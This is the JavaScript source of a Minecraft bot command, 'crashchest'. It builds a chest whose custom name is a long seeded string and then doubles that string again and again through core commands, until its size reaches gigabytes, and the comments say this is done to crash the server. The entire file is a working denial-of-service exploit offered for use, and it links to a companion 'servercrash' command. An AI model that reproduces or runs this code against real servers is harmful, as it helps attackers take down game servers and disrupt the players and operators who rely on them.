'use strict';

const { chestPosition, chineseSeed, SEED_LENGTH, BYTES_PER_CHAR, COMMAND_LIMIT } = require('../crash');

// A command written into a core block runs on the next tick, so a step that
// reads what the previous one wrote leaves it a tick to land. 100ms is two
// ticks: enough for the block entity to be updated, short enough that the whole
// build is a handful of them instead of the reference script's ~27 seconds.
const STEP_MS = 100;
const DEFAULT_DOUBLINGS = 6;
// Each doubling is one tick and one more copy of everything already there; past
// ten the value is already gigabytes and the server is gone well before it.
const MAX_DOUBLINGS = 10;

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

module.exports = {
    name: 'crashchest',
    description: 'Build the crash chest that servercrash scoreboard points at (admin only)',
    usage: 'crashchest [doublings]',
    level: 'admin',

    async execute(ctx) {
        const core = ctx.bot.core;
        if (!core || !core.ready) return ctx.reply('Core is not ready.');

        const requested = parseInt(ctx.args[0], 10);
        const doublings = Math.max(
            0,
            Math.min(Number.isFinite(requested) ? requested : DEFAULT_DOUBLINGS, MAX_DOUBLINGS)
        );

        const position = chestPosition(ctx.bot);
        if (!position) return ctx.reply('No position yet: the bot has not seen a spawn packet.');
        const at = `${position.x} ${position.y} ${position.z}`;

        // One command seeds the whole string: the seed is as long as a core
        // command can be, so no book, no inventory and no per-page copies.
        const merge = `data merge block ${at} {CustomName:{text:"",extra:["${chineseSeed()}"]}}`;
        if (merge.length > COMMAND_LIMIT) return ctx.reply('The seed does not fit one core command.');

        ctx.run(`setblock ${at} minecraft:air`);
        await sleep(STEP_MS);

        if (!ctx.run(`setblock ${at} minecraft:chest`)) return ctx.reply('The core could not place the chest.');
        await sleep(STEP_MS);

        if (!ctx.run(merge)) return ctx.reply('The core could not write the chest name.');
        await sleep(STEP_MS);

        // Appending the component to itself doubles it; each one has to see the
        // last one's result, so they go one tick apart.
        for (let i = 0; i < doublings; i++) {
            if (!ctx.run(`data modify block ${at} CustomName.extra append from block ${at} CustomName`)) {
                return ctx.reply(`The core stopped after ${i} doubling(s).`);
            }
            await sleep(STEP_MS);
        }

        // Remembered for `servercrash scoreboard`, which then needs no arguments.
        ctx.bot.crashChest = position;

        const chars = SEED_LENGTH * 2 ** doublings;
        return ctx.reply(
            `Crash chest at ${at}: ${SEED_LENGTH.toLocaleString()} chars x2^${doublings} = ` +
            `${chars.toLocaleString()} chars (~${(chars * BYTES_PER_CHAR).toLocaleString()} bytes).`
        );
    }
};
